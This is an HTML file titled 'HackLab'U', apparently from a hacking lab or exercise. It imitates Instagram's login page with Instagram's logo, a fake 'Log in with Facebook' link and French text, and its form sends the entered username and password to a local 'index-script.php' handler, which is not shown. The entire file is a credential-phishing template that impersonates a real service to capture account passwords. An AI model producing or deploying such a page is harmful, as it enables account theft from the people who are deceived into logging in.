<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="css/styles.css">
    <title>HackLab'U</title>
  </head>

  <body>
    <body style="background-color:#FAFAFA;">

    <div class="formulaire">
      <form action="index-script.php" method="post" name="insta">
        <div class="login-bloc">
          <img src="images/instagram-new-logo.png">

          <div class="login-content">
            <div class="input-group">
              <input name="id" placeholder="Username" type="text" required=""/>
            </div>

            <div class="input-group">
              <input name="motdepass" placeholder="Password" type="password" required=""/>
            </div>
          </div>

          <div class="login-action">
            <input type="submit" value="Connectez-vous" name="inserer">
          </div>

          <div class="ou-ligne">
            <img src="images/ou-insta.png"/>
          </div>

          <div class="autre-connection">
            <div class="fb-connection">
              <img src="images/logo-fb.png">
              <a href= "https://www.facebook.com/"> Log in with Facebook </a> 
            </div>
            <p>Forgot password ?</p>
          </div>
        </div>
      </form>
    </div>

  </body>
</html>
